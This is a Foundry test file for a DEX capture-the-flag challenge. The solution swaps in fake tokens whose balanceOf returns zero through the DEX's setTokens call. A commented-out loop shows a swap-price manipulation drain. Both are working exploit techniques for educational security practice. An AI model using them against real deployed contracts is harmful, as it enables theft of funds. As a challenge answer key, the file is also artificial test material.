// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {SakarDEXCTFDeployer} from "script/sakarkc2122-dex/SakarDEXCTFDeployer.s.sol";
import {IDex} from "src/sakarkc2122-dex/interfaces/IDex.sol";
import {IToken1} from "src/sakarkc2122-dex/interfaces/IToken1.sol";
import {IToken2} from "src/sakarkc2122-dex/interfaces/IToken2.sol";

/*///////////////////////////////////////////////
// Import dependencies for your solution here! //
//             (if you need any)               //
///////////////////////////////////////////////*/
contract FakeToken {
    function balanceOf(address account) external view returns (uint256) {
        return 0;
    }
}

contract SakarDEXCTFTest is Test, SakarDEXCTFDeployer {
    IDex public dex;
    IToken1 public token1;
    IToken2 public token2;

    /// @notice Deploy the ExampleCTF and the solution contract
    function setUp() public override(SakarDEXCTFDeployer) {
        address sakar = makeAddr("I am Sakar and I am deploying this CTF!");

        SakarDEXCTFDeployer.setUp();

        (address _dex, address _token1, address _token2) = deploySakarDEXCTF();

        dex = IDex(_dex);
        token1 = IToken1(_token1);
        token2 = IToken2(_token2);

        vm.startPrank(sakar);

        token1.mint(sakar, 1000);
        token2.mint(sakar, 1000);
        dex.setTokens(address(token1), address(token2));
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);
        dex.addLiquidity(address(token1), 1000);
        dex.addLiquidity(address(token2), 1000);

        vm.stopPrank();
    }

    /// @notice Test that the ExampleCTF is unsolved if we don't do anything
    function test_sakarDEXUnsolved() external {
        address user = makeAddr("user");
        token1.mint(user, 100);
        token2.mint(user, 100);

        assertFalse(dex.isSolved());
    }

    /// @notice Test that the ExampleCTF is solved if we call the solve function
    function test_sakarDEXSolved() external {
        address user = makeAddr("user");
        token1.mint(user, 100);
        token2.mint(user, 100);
        /*//////////////////////////////////////
        //     Write your solution here       //
        //////////////////////////////////////*/
        // vm.startPrank(user);

        // token1.approve(address(dex), type(uint256).max);
        // token2.approve(address(dex), type(uint256).max);

        // uint256 amountToken1;
        // uint256 amountToken2;
        // uint256 swapPrice;
        // while (token1.balanceOf(address(dex)) > 0 || token2.balanceOf(address(dex)) > 0) {
        //     console2.log("\nSwap 1 for 2");
        //     swapPrice = getSwapPrice(address(token1), address(token2), token1.balanceOf(user));
        //     if (swapPrice == 0) {
        //         dex.swap(address(token2), address(token1), 0);
        //         break;
        //     }
        //     amountToken1 =
        //         token2.balanceOf(address(dex)) > swapPrice ? token1.balanceOf(user) : token1.balanceOf(address(dex));
        //     dex.swap(address(token1), address(token2), amountToken1);

        //     console2.log("User token1 balance", token1.balanceOf(user));
        //     console2.log("User token2 balance", token2.balanceOf(user));
        //     console2.log("Dex token1 balance", token1.balanceOf(address(dex)));
        //     console2.log("Dex token2 balance", token2.balanceOf(address(dex)));

        //     console2.log("\nSwap 2 for 1");
        //     swapPrice = getSwapPrice(address(token2), address(token1), token2.balanceOf(user));
        //     if (swapPrice == 0) {
        //         dex.swap(address(token2), address(token1), 0);
        //         break;
        //     }
        //     amountToken2 =
        //         token1.balanceOf(address(dex)) > swapPrice ? token2.balanceOf(user) : token2.balanceOf(address(dex));
        //     dex.swap(address(token2), address(token1), amountToken2);

        //     console2.log("User token1 balance", token1.balanceOf(user));
        //     console2.log("User token2 balance", token2.balanceOf(user));
        //     console2.log("Dex token1 balance", token1.balanceOf(address(dex)));
        //     console2.log("Dex token2 balance", token2.balanceOf(address(dex)));
        // }
        FakeToken tokenA = new FakeToken();
        FakeToken tokenB = new FakeToken();
        dex.setTokens(address(tokenA), address(tokenB));
        dex.solve();

        assertTrue(dex.isSolved());
    }

    // function getSwapPrice(address tokenIn, address tokenOut, uint256 amount) private view returns (uint256) {
    //     if (IToken(tokenIn).balanceOf(address(dex)) == 0) {
    //         return 0;
    //     }
    //     return (amount * IToken(tokenOut).balanceOf(address(dex)) / IToken(tokenIn).balanceOf(address(dex)));
    // }
}
